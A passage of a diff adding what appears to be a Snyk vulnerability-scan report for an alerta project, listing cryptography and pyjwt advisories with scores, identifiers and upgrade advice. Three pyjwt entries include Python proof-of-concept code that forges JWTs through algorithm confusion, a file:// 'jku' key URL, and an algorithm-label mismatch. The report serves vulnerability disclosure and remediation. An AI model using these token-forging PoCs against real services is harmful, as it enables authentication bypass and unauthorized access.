+        "description": "## Overview\n\nAffected versions of this package are vulnerable to Out-of-bounds Read in the ASN.1 decoder. An attacker can crash the application or cause memory beyond the end of the input buffer to be loaded into the decoded ASN.1 object, by supplying very large input data. Applications that pass untrusted input to `d2i_X509()`, `d2i_PKCS7()`, or other `d2i_*` functions are affected. OpenSSL command line tools are not.\r\n\r\n**Note:** Only 64-bit Unix-like systems are vulnerable.\n## Remediation\nUpgrade `cryptography` to version 48.0.1 or higher.\n## References\n- [GitHub Commit](https://github.com/openssl/openssl/commit/e734e38ab606c62de2ee9410cb3222b99e6fc2e3)\n- [GitHub Security Advisory](https://github.com/pyca/cryptography/security/advisories/GHSA-537c-gmf6-5ccf)\n- [Vulnerability Advisory](https://openssl-library.org/news/secadv/20260609.txt)\n",
+        "epssDetails": {
+          "percentile": "0.39566",
+          "probability": "0.00513",
+          "modelVersion": "v2026.06.15"
+        },
+        "identifiers": {
+          "CVE": [
+            "CVE-2026-34180"
+          ],
+          "CWE": [
+            "CWE-125"
+          ],
+          "GHSA": [
+            "GHSA-537c-gmf6-5ccf"
+          ]
+        },
+        "packageName": "cryptography",
+        "proprietary": false,
+        "creationTime": "2026-06-16T12:32:39.809014Z",
+        "functions_new": [],
+        "alternativeIds": [],
+        "disclosureTime": "2026-06-09T18:33:21Z",
+        "exploitDetails": {
+          "sources": [],
+          "maturityLevels": [
+            {
+              "type": "secondary",
+              "level": "Not Defined",
+              "format": "CVSSv3"
+            },
+            {
+              "type": "primary",
+              "level": "Not Defined",
+              "format": "CVSSv4"
+            }
+          ]
+        },
+        "packageManager": "pip",
+        "publicationTime": "2026-06-17T08:01:48.486285Z",
+        "severityBasedOn": "CVSS",
+        "modificationTime": "2026-07-10T02:01:07.616348Z",
+        "socialTrendAlert": true,
+        "packagePopularityRank": 99,
+        "from": [
+          "alerta__alerta@0.0.0",
+          "cryptography@46.0.6"
+        ],
+        "upgradePath": [],
+        "isUpgradable": false,
+        "isPatchable": false,
+        "isPinnable": true,
+        "isRuntime": false,
+        "name": "cryptography",
+        "version": "46.0.6",
+        "severityWithCritical": "high"
+      },
+      {
+        "id": "SNYK-PYTHON-PYJWT-17053408",
+        "title": "Improper Authentication",
+        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N/E:P",
+        "credit": [
+          "Arad Inbar"
+        ],
+        "semver": {
+          "vulnerable": [
+            "[,2.13.0)"
+          ]
+        },
+        "exploit": "Proof of Concept",
+        "fixedIn": [
+          "2.13.0"
+        ],
+        "patches": [],
+        "insights": {
+          "triageAdvice": null
+        },
+        "language": "python",
+        "severity": "high",
+        "cvssScore": 8.8,
+        "functions": [],
+        "malicious": false,
+        "isDisputed": false,
+        "moduleName": "pyjwt",
+        "references": [
+          {
+            "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-xgmm-8j9v-c9wx",
+            "title": "GitHub Advisory"
+          },
+          {
+            "url": "https://github.com/jpadilla/pyjwt/commit/95791b1759b8aa4f2203575d344d5c78564cdc81",
+            "title": "GitHub Commit"
+          }
+        ],
+        "cvssDetails": [
+          {
+            "assigner": "Red Hat",
+            "severity": "high",
+            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+            "cvssV3BaseScore": 7.4,
+            "modificationTime": "2026-06-05T17:03:53.400121Z"
+          },
+          {
+            "assigner": "SUSE",
+            "severity": "high",
+            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+            "cvssV3BaseScore": 7.4,
+            "modificationTime": "2026-06-24T11:13:14.206309Z"
+          }
+        ],
+        "cvssSources": [
+          {
+            "type": "primary",
+            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N/E:P",
+            "assigner": "Snyk",
+            "severity": "high",
+            "baseScore": 8.8,
+            "cvssVersion": "4.0",
+            "modificationTime": "2026-07-03T14:06:52.367144Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N/E:P",
+            "assigner": "Snyk",
+            "severity": "high",
+            "baseScore": 8.2,
+            "cvssVersion": "3.1",
+            "modificationTime": "2026-07-03T14:06:52.367144Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+            "assigner": "Red Hat",
+            "severity": "high",
+            "baseScore": 7.4,
+            "cvssVersion": "3.1",
+            "modificationTime": "2026-06-05T17:03:53.400121Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+            "assigner": "SUSE",
+            "severity": "high",
+            "baseScore": 7.4,
+            "cvssVersion": "3.1",
+            "modificationTime": "2026-06-24T11:13:14.206309Z"
+          }
+        ],
+        "description": "## Overview\n\nAffected versions of this package are vulnerable to Improper Authentication when decoding JSON Web Tokens. An attacker can forge valid tokens by supplying a public key as the secret for the HMAC algorithm when both asymmetric and HMAC algorithms are supported.\n## PoC\n```python\nfrom jwt.api_jws import PyJWS\nimport json, base64, hmac, hashlib\n\ndef b64u(b): return base64.urlsafe_b64encode(b).rstrip(b\"=\")\n\n# Public RSA JWK (public by design)\nrsa_jwk_json = json.dumps({\"kty\":\"RSA\",\"n\":\"AQAB\",\"e\":\"AQAB\"})\n\n# Attacker-crafted token: flip to HS256 and choose claims\nheader  = b64u(b'{\"alg\":\"HS256\",\"typ\":\"JWT\"}')\npayload = b64u(b'{\"sub\":\"alice\",\"admin\":true}')\nsigning = header + b\".\" + payload\n\n# Sign with HMAC using the PUBLIC JWK JSON TEXT as the “secret”\nsig   = hmac.new(rsa_jwk_json.encode(), signing, hashlib.sha256).digest()\ntoken = (signing + b\".\" + b64u(sig)).decode()\n\n# Vulnerable verifier: mixed families + JWK JSON string as key\njws = PyJWS()\nprint(jws.decode(token, key=rsa_jwk_json, algorithms=[\"HS256\",\"RS256\"]))\n# -> b'{\"sub\":\"alice\",\"admin\":true}'\n```\n## Remediation\nUpgrade `pyjwt` to version 2.13.0 or higher.\n## References\n- [GitHub Advisory](https://github.com/jpadilla/pyjwt/security/advisories/GHSA-xgmm-8j9v-c9wx)\n- [GitHub Commit](https://github.com/jpadilla/pyjwt/commit/95791b1759b8aa4f2203575d344d5c78564cdc81)\n",
+        "epssDetails": {
+          "percentile": "0.31317",
+          "probability": "0.00394",
+          "modelVersion": "v2026.06.15"
+        },
+        "identifiers": {
+          "CVE": [
+            "CVE-2026-48526"
+          ],
+          "CWE": [
+            "CWE-287"
+          ],
+          "GHSA": [
+            "GHSA-xgmm-8j9v-c9wx"
+          ]
+        },
+        "packageName": "pyjwt",
+        "proprietary": false,
+        "creationTime": "2026-05-29T07:28:00.475438Z",
+        "functions_new": [],
+        "alternativeIds": [],
+        "disclosureTime": "2026-05-28T16:50:06.686000Z",
+        "exploitDetails": {
+          "sources": [
+            "Snyk"
+          ],
+          "maturityLevels": [
+            {
+              "type": "secondary",
+              "level": "Proof of Concept",
+              "format": "CVSSv3"
+            },
+            {
+              "type": "primary",
+              "level": "Proof of Concept",
+              "format": "CVSSv4"
+            }
+          ]
+        },
+        "packageManager": "pip",
+        "publicationTime": "2026-05-29T07:28:00.692526Z",
+        "severityBasedOn": "CVSS",
+        "modificationTime": "2026-07-03T14:06:52.367144Z",
+        "socialTrendAlert": false,
+        "packagePopularityRank": 99,
+        "from": [
+          "alerta__alerta@0.0.0",
+          "pyjwt@2.12.1"
+        ],
+        "upgradePath": [],
+        "isUpgradable": false,
+        "isPatchable": false,
+        "isPinnable": true,
+        "isRuntime": false,
+        "name": "pyjwt",
+        "version": "2.12.1",
+        "severityWithCritical": "high"
+      },
+      {
+        "id": "SNYK-PYTHON-PYJWT-17053409",
+        "title": "Allocation of Resources Without Limits or Throttling",
+        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P",
+        "credit": [
+          "Ali Firas (thesmartshadow)"
+        ],
+        "semver": {
+          "vulnerable": [
+            "[,2.13.0)"
+          ]
+        },
+        "exploit": "Proof of Concept",
+        "fixedIn": [
+          "2.13.0"
+        ],
+        "patches": [],
+        "insights": {
+          "triageAdvice": null
+        },
+        "language": "python",
+        "severity": "medium",
+        "cvssScore": 6.9,
+        "functions": [],
+        "malicious": false,
+        "isDisputed": false,
+        "moduleName": "pyjwt",
+        "references": [
+          {
+            "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-w7vc-732c-9m39",
+            "title": "GitHub Advisory"
+          },
+          {
+            "url": "https://github.com/jpadilla/pyjwt/commit/95791b1759b8aa4f2203575d344d5c78564cdc81",
+            "title": "GitHub Commit"
+          }
+        ],
+        "cvssDetails": [
+          {
+            "assigner": "Red Hat",
+            "severity": "medium",
+            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+            "cvssV3BaseScore": 5.3,
+            "modificationTime": "2026-06-05T09:50:42.863958Z"
+          },
+          {
+            "assigner": "SUSE",
+            "severity": "high",
+            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+            "cvssV3BaseScore": 7.5,
+            "modificationTime": "2026-06-24T11:12:57.793578Z"
+          }
+        ],
+        "cvssSources": [
+          {
+            "type": "primary",
+            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P",
+            "assigner": "Snyk",
+            "severity": "medium",
+            "baseScore": 6.9,
+            "cvssVersion": "4.0",
+            "modificationTime": "2026-06-24T11:12:58.433243Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P",
+            "assigner": "Snyk",
+            "severity": "medium",
+            "baseScore": 5.3,
+            "cvssVersion": "3.1",
+            "modificationTime": "2026-06-24T11:12:58.433243Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+            "assigner": "Red Hat",
+            "severity": "medium",
+            "baseScore": 5.3,
+            "cvssVersion": "3.1",
+            "modificationTime": "2026-06-05T09:50:42.863958Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+            "assigner": "SUSE",
+            "severity": "high",
+            "baseScore": 7.5,
+            "cvssVersion": "3.1",
+            "modificationTime": "2026-06-24T11:12:57.793578Z"
+          }
+        ],
+        "description": "## Overview\n\nAffected versions of this package are vulnerable to Allocation of Resources Without Limits or Throttling via the Base64URL decoding process. An attacker can cause excessive CPU and memory consumption by supplying an arbitrarily large payload segment when verifying detached JWS tokens with the unencoded-payload option enabled.\n## Remediation\nUpgrade `pyjwt` to version 2.13.0 or higher.\n## References\n- [GitHub Advisory](https://github.com/jpadilla/pyjwt/security/advisories/GHSA-w7vc-732c-9m39)\n- [GitHub Commit](https://github.com/jpadilla/pyjwt/commit/95791b1759b8aa4f2203575d344d5c78564cdc81)\n",
+        "epssDetails": {
+          "percentile": "0.20272",
+          "probability": "0.00288",
+          "modelVersion": "v2026.06.15"
+        },
+        "identifiers": {
+          "CVE": [
+            "CVE-2026-48525"
+          ],
+          "CWE": [
+            "CWE-770"
+          ],
+          "GHSA": [
+            "GHSA-w7vc-732c-9m39"
+          ]
+        },
+        "packageName": "pyjwt",
+        "proprietary": false,
+        "creationTime": "2026-05-29T07:34:49.244071Z",
+        "functions_new": [],
+        "alternativeIds": [],
+        "disclosureTime": "2026-05-28T16:50:07.421000Z",
+        "exploitDetails": {
+          "sources": [
+            "Snyk"
+          ],
+          "maturityLevels": [
+            {
+              "type": "secondary",
+              "level": "Proof of Concept",
+              "format": "CVSSv3"
+            },
+            {
+              "type": "primary",
+              "level": "Proof of Concept",
+              "format": "CVSSv4"
+            }
+          ]
+        },
+        "packageManager": "pip",
+        "publicationTime": "2026-05-29T07:34:49.458674Z",
+        "severityBasedOn": "CVSS",
+        "modificationTime": "2026-06-24T11:12:58.433243Z",
+        "socialTrendAlert": false,
+        "packagePopularityRank": 99,
+        "from": [
+          "alerta__alerta@0.0.0",
+          "pyjwt@2.12.1"
+        ],
+        "upgradePath": [],
+        "isUpgradable": false,
+        "isPatchable": false,
+        "isPinnable": true,
+        "isRuntime": false,
+        "name": "pyjwt",
+        "version": "2.12.1",
+        "severityWithCritical": "medium"
+      },
+      {
+        "id": "SNYK-PYTHON-PYJWT-17054465",
+        "title": "Improper Cleanup on Thrown Exception",
+        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+        "credit": [
+          "Unknown"
+        ],
+        "semver": {
+          "vulnerable": [
+            "[,2.13.0)"
+          ]
+        },
+        "exploit": "Not Defined",
+        "fixedIn": [
+          "2.13.0"
+        ],
+        "patches": [],
+        "insights": {
+          "triageAdvice": null
+        },
+        "language": "python",
+        "severity": "medium",
+        "cvssScore": 6.3,
+        "functions": [],
+        "malicious": false,
+        "isDisputed": false,
+        "moduleName": "pyjwt",
+        "references": [
+          {
+            "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-fhv5-28vv-h8m8",
+            "title": "GitHub Advisory"
+          },
+          {
+            "url": "https://github.com/jpadilla/pyjwt/commit/95791b1759b8aa4f2203575d344d5c78564cdc81",
+            "title": "GitHub Commit"
+          }
+        ],
+        "cvssDetails": [
+          {
+            "assigner": "Red Hat",
+            "severity": "medium",
+            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
+            "cvssV3BaseScore": 5.9,
+            "modificationTime": "2026-06-05T09:49:35.625524Z"
+          },
+          {
+            "assigner": "SUSE",
+            "severity": "low",
+            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+            "cvssV3BaseScore": 3.7,
+            "modificationTime": "2026-06-24T11:12:49.497141Z"
+          }
+        ],
+        "cvssSources": [
+          {
+            "type": "primary",
+            "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
+            "assigner": "Snyk",
+            "severity": "medium",
+            "baseScore": 6.3,
+            "cvssVersion": "4.0",
+            "modificationTime": "2026-06-24T11:12:49.893339Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+            "assigner": "Snyk",
+            "severity": "low",
+            "baseScore": 3.7,
+            "cvssVersion": "3.1",
+            "modificationTime": "2026-06-24T11:12:49.893339Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
+            "assigner": "Red Hat",
+            "severity": "medium",
+            "baseScore": 5.9,
+            "cvssVersion": "3.1",
+            "modificationTime": "2026-06-05T09:49:35.625524Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+            "assigner": "SUSE",
+            "severity": "low",
+            "baseScore": 3.7,
+            "cvssVersion": "3.1",
+            "modificationTime": "2026-06-24T11:12:49.497141Z"
+          }
+        ],
+        "description": "## Overview\n\nAffected versions of this package are vulnerable to Improper Cleanup on Thrown Exception via the `get_signing_key` function. An attacker can exhaust system resources by sending numerous JWTs with attacker-controlled `kid` values, causing repeated outbound requests to the JWKS endpoint.\n\n**Note:**\n\nThis is only exploitable if the JWKS fetch fails and the upstream endpoint does not implement effective rate limiting or error handling.\n## Remediation\nUpgrade `pyjwt` to version 2.13.0 or higher.\n## References\n- [GitHub Advisory](https://github.com/jpadilla/pyjwt/security/advisories/GHSA-fhv5-28vv-h8m8)\n- [GitHub Commit](https://github.com/jpadilla/pyjwt/commit/95791b1759b8aa4f2203575d344d5c78564cdc81)\n",
+        "epssDetails": {
+          "percentile": "0.12568",
+          "probability": "0.00222",
+          "modelVersion": "v2026.06.15"
+        },
+        "identifiers": {
+          "CVE": [
+            "CVE-2026-48524"
+          ],
+          "CWE": [
+            "CWE-460"
+          ],
+          "GHSA": [
+            "GHSA-fhv5-28vv-h8m8"
+          ]
+        },
+        "packageName": "pyjwt",
+        "proprietary": false,
+        "creationTime": "2026-05-29T07:38:09.130353Z",
+        "functions_new": [],
+        "alternativeIds": [],
+        "disclosureTime": "2026-05-28T16:50:11.956000Z",
+        "exploitDetails": {
+          "sources": [],
+          "maturityLevels": [
+            {
+              "type": "secondary",
+              "level": "Not Defined",
+              "format": "CVSSv3"
+            },
+            {
+              "type": "primary",
+              "level": "Not Defined",
+              "format": "CVSSv4"
+            }
+          ]
+        },
+        "packageManager": "pip",
+        "publicationTime": "2026-05-29T07:38:09.318424Z",
+        "severityBasedOn": "CVSS",
+        "modificationTime": "2026-06-24T11:12:49.893339Z",
+        "socialTrendAlert": false,
+        "packagePopularityRank": 99,
+        "from": [
+          "alerta__alerta@0.0.0",
+          "pyjwt@2.12.1"
+        ],
+        "upgradePath": [],
+        "isUpgradable": false,
+        "isPatchable": false,
+        "isPinnable": true,
+        "isRuntime": false,
+        "name": "pyjwt",
+        "version": "2.12.1",
+        "severityWithCritical": "medium"
+      },
+      {
+        "id": "SNYK-PYTHON-PYJWT-17054901",
+        "title": "Unintended Proxy or Intermediary ('Confused Deputy')",
+        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N/E:P",
+        "credit": [
+          "Keijo Tuominen"
+        ],
+        "semver": {
+          "vulnerable": [
+            "[,2.13.0)"
+          ]
+        },
+        "exploit": "Proof of Concept",
+        "fixedIn": [
+          "2.13.0"
+        ],
+        "patches": [],
+        "insights": {
+          "triageAdvice": null
+        },
+        "language": "python",
+        "severity": "low",
+        "cvssScore": 2.1,
+        "functions": [],
+        "malicious": false,
+        "isDisputed": false,
+        "moduleName": "pyjwt",
+        "references": [
+          {
+            "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-993g-76c3-p5m4",
+            "title": "GitHub Advisory"
+          },
+          {
+            "url": "https://github.com/jpadilla/pyjwt/commit/95791b1759b8aa4f2203575d344d5c78564cdc81",
+            "title": "GitHub Commit"
+          }
+        ],
+        "cvssDetails": [
+          {
+            "assigner": "Red Hat",
+            "severity": "medium",
+            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N",
+            "cvssV3BaseScore": 4.2,
+            "modificationTime": "2026-06-05T09:50:11.301233Z"
+          },
+          {
+            "assigner": "SUSE",
+            "severity": "medium",
+            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N",
+            "cvssV3BaseScore": 4.8,
+            "modificationTime": "2026-06-24T11:12:45.723682Z"
+          }
+        ],
+        "cvssSources": [
+          {
+            "type": "primary",
+            "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N/E:P",
+            "assigner": "Snyk",
+            "severity": "low",
+            "baseScore": 2.1,
+            "cvssVersion": "4.0",
+            "modificationTime": "2026-06-24T11:12:46.188502Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N/E:P",
+            "assigner": "Snyk",
+            "severity": "medium",
+            "baseScore": 4.2,
+            "cvssVersion": "3.1",
+            "modificationTime": "2026-06-24T11:12:46.188502Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N",
+            "assigner": "Red Hat",
+            "severity": "medium",
+            "baseScore": 4.2,
+            "cvssVersion": "3.1",
+            "modificationTime": "2026-06-05T09:50:11.301233Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N",
+            "assigner": "SUSE",
+            "severity": "medium",
+            "baseScore": 4.8,
+            "cvssVersion": "3.1",
+            "modificationTime": "2026-06-24T11:12:45.723682Z"
+          }
+        ],
+        "description": "## Overview\n\nAffected versions of this package are vulnerable to Unintended Proxy or Intermediary ('Confused Deputy') via the `uri` parameter being passed directly to `urllib.request.urlopen`, which allows fetching resources using unsupported schemes such as `file`, `ftp`, and `data`. An attacker can access arbitrary local files or external resources and potentially forge tokens by supplying crafted URLs.\n\n**Note:**\n\nThis is only exploitable if the application's jku URL ingestion path accepts attacker-controlled URLs.\n## PoC\n```python\nimport jwt as pyjwt\nfrom jwt import PyJWKClient\nfrom cryptography.hazmat.primitives.asymmetric import rsa\nfrom cryptography.hazmat.primitives import serialization\nimport json, base64, time\n\n# Attacker generates keypair (no relation to real IdP)\nkey = rsa.generate_private_key(public_exponent=65537, key_size=2048)\npub_n = key.public_key().public_numbers().n\n\ndef b64u(n):\n    bl = (n.bit_length() + 7) // 8\n    return base64.urlsafe_b64encode(n.to_bytes(bl, 'big')).rstrip(b'=').decode()\n\n# Attacker writes JWK Set containing their public key to /tmp\njwks = {\"keys\":[{\"kty\":\"RSA\",\"kid\":\"attacker\",\"use\":\"sig\",\"alg\":\"RS256\",\n                  \"n\":b64u(pub_n),\"e\":\"AQAB\"}]}\nwith open(\"/tmp/attacker.json\",\"w\") as f:\n    json.dump(jwks, f)\n\n# Attacker mints token signed with their private key, jku=file://\npriv_pem = key.private_bytes(serialization.Encoding.PEM,\n    serialization.PrivateFormat.PKCS8, serialization.NoEncryption())\nnow = int(time.time())\ntoken = pyjwt.encode(\n    {\"sub\":\"attacker\",\"aud\":\"target-app\",\"iat\":now,\"exp\":now+3600},\n    priv_pem, algorithm=\"RS256\",\n    headers={\"kid\":\"attacker\",\"jku\":\"file:///tmp/attacker.json\",\"typ\":\"JWT\"})\n\n# Vulnerable application pattern: caller derives jku from token header\n# and passes to PyJWKClient without scheme validation\nheader = pyjwt.get_unverified_header(token)\nclient = PyJWKClient(header[\"jku\"])      # <-- accepts file:// silently\nkey_obj = client.get_signing_key_from_jwt(token)\ndecoded = pyjwt.decode(token, key_obj.key, algorithms=[\"RS256\"],\n                       audience=\"target-app\")\nprint(\"Token verified:\", decoded)\n# Output: Token verified: {'sub': 'attacker', 'aud': 'target-app', ...}\n```\n## Remediation\nUpgrade `pyjwt` to version 2.13.0 or higher.\n## References\n- [GitHub Advisory](https://github.com/jpadilla/pyjwt/security/advisories/GHSA-993g-76c3-p5m4)\n- [GitHub Commit](https://github.com/jpadilla/pyjwt/commit/95791b1759b8aa4f2203575d344d5c78564cdc81)\n",
+        "epssDetails": {
+          "percentile": "0.07768",
+          "probability": "0.00181",
+          "modelVersion": "v2026.06.15"
+        },
+        "identifiers": {
+          "CVE": [
+            "CVE-2026-48522"
+          ],
+          "CWE": [
+            "CWE-441"
+          ],
+          "GHSA": [
+            "GHSA-993g-76c3-p5m4"
+          ]
+        },
+        "packageName": "pyjwt",
+        "proprietary": false,
+        "creationTime": "2026-05-29T07:42:43.584532Z",
+        "functions_new": [],
+        "alternativeIds": [],
+        "disclosureTime": "2026-05-28T16:50:13.792000Z",
+        "exploitDetails": {
+          "sources": [
+            "Snyk"
+          ],
+          "maturityLevels": [
+            {
+              "type": "secondary",
+              "level": "Proof of Concept",
+              "format": "CVSSv3"
+            },
+            {
+              "type": "primary",
+              "level": "Proof of Concept",
+              "format": "CVSSv4"
+            }
+          ]
+        },
+        "packageManager": "pip",
+        "publicationTime": "2026-05-29T07:42:43.773556Z",
+        "severityBasedOn": "CVSS",
+        "modificationTime": "2026-06-24T11:12:46.188502Z",
+        "socialTrendAlert": false,
+        "packagePopularityRank": 99,
+        "from": [
+          "alerta__alerta@0.0.0",
+          "pyjwt@2.12.1"
+        ],
+        "upgradePath": [],
+        "isUpgradable": false,
+        "isPatchable": false,
+        "isPinnable": true,
+        "isRuntime": false,
+        "name": "pyjwt",
+        "version": "2.12.1",
+        "severityWithCritical": "low"
+      },
+      {
+        "id": "SNYK-PYTHON-PYJWT-17054902",
+        "title": "Improper Verification of Cryptographic Signature",
+        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N/E:P",
+        "credit": [
+          "Unknown"
+        ],
+        "semver": {
+          "vulnerable": [
+            "[,2.13.0)"
+          ]
+        },
+        "exploit": "Proof of Concept",
+        "fixedIn": [
+          "2.13.0"
+        ],
+        "patches": [],
+        "insights": {
+          "triageAdvice": null
+        },
+        "language": "python",
+        "severity": "medium",
+        "cvssScore": 5.3,
+        "functions": [],
+        "malicious": false,
+        "isDisputed": false,
+        "moduleName": "pyjwt",
+        "references": [
+          {
+            "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-jq35-7prp-9v3f",
+            "title": "GitHub Advisory"
+          },
+          {
+            "url": "https://github.com/jpadilla/pyjwt/commit/95791b1759b8aa4f2203575d344d5c78564cdc81",
+            "title": "GitHub Commit"
+          }
+        ],
+        "cvssDetails": [
+          {
+            "assigner": "Red Hat",
+            "severity": "medium",
+            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N",
+            "cvssV3BaseScore": 5.4,
+            "modificationTime": "2026-06-05T09:54:01.385399Z"
+          },
+          {
+            "assigner": "SUSE",
+            "severity": "medium",
+            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N",
+            "cvssV3BaseScore": 5.4,
+            "modificationTime": "2026-06-24T11:13:01.388342Z"
+          }
+        ],
+        "cvssSources": [
+          {
+            "type": "primary",
+            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N/E:P",
+            "assigner": "Snyk",
+            "severity": "medium",
+            "baseScore": 5.3,
+            "cvssVersion": "4.0",
+            "modificationTime": "2026-06-24T11:13:02.152713Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N/E:P",
+            "assigner": "Snyk",
+            "severity": "medium",
+            "baseScore": 5.4,
+            "cvssVersion": "3.1",
+            "modificationTime": "2026-06-24T11:13:02.152713Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N",
+            "assigner": "Red Hat",
+            "severity": "medium",
+            "baseScore": 5.4,
+            "cvssVersion": "3.1",
+            "modificationTime": "2026-06-05T09:54:01.385399Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N",
+            "assigner": "SUSE",
+            "severity": "medium",
+            "baseScore": 5.4,
+            "cvssVersion": "3.1",
+            "modificationTime": "2026-06-24T11:13:01.388342Z"
+          }
+        ],
+        "description": "## Overview\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature via the `jwt.decode` or `jwt.decode_complete` functions when used with a `PyJWK` key. An attacker can bypass algorithm restrictions and gain unauthorized access to protected resources by signing a token with a disallowed algorithm, setting an allowed algorithm in the JWT header, and leveraging control over a registered JWK/JWKS private key.\n## PoC\n```python\nimport json\nimport jwt\nfrom cryptography.hazmat.primitives.asymmetric import rsa\nfrom cryptography.hazmat.primitives.serialization import Encoding, PublicFormat\nfrom jwt.api_jwk import PyJWK\nfrom jwt.algorithms import RSAAlgorithm\nfrom jwt.utils import base64url_encode\n\n# Generate an RSA keypair controlled by the attacker.\npriv = rsa.generate_private_key(public_exponent=65537, key_size=2048)\npub = priv.public_key()\npub_pem = pub.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)\n\n# Build a PyJWK from the public key.\n# With an RSA JWK and no explicit alg, PyJWK binds to RS256 by default.\njwk = PyJWK.from_json(RSAAlgorithm.to_jwk(pub))\n\n# Create a token whose protected header claims RS512.\nheader = {\"typ\": \"JWT\", \"alg\": \"RS512\"}\npayload = {\"sub\": \"alice\"}\n\nheader_b64 = base64url_encode(\n    json.dumps(header, separators=(\",\", \":\"), sort_keys=True).encode()\n)\npayload_b64 = base64url_encode(\n    json.dumps(payload, separators=(\",\", \":\")).encode()\n)\nsigning_input = b\".\".join([header_b64, payload_b64])\n\n# Sign the RS512-labelled token with RS256 instead.\nsig = RSAAlgorithm(RSAAlgorithm.SHA256).sign(signing_input, priv)\ntoken = b\".\".join([header_b64, payload_b64, base64url_encode(sig)]).decode()\n\nprint(\"token:\", token)\nprint(\"PyJWK path:\")\nprint(jwt.decode(token, jwk, algorithms=[\"RS512\"]))\n\nprint(\"PEM path:\")\ntry:\n    print(jwt.decode(token, pub_pem, algorithms=[\"RS512\"]))\nexcept Exception as e:\n    print(f\"{type(e).__name__}: {e}\")\n```\n## Remediation\nUpgrade `pyjwt` to version 2.13.0 or higher.\n## References\n- [GitHub Advisory](https://github.com/jpadilla/pyjwt/security/advisories/GHSA-jq35-7prp-9v3f)\n- [GitHub Commit](https://github.com/jpadilla/pyjwt/commit/95791b1759b8aa4f2203575d344d5c78564cdc81)\n",
+        "epssDetails": {
+          "percentile": "0.02650",
+          "probability": "0.00127",
+          "modelVersion": "v2026.06.15"
+        },
+        "identifiers": {
+          "CVE": [
+            "CVE-2026-48523"
+          ],
+          "CWE": [
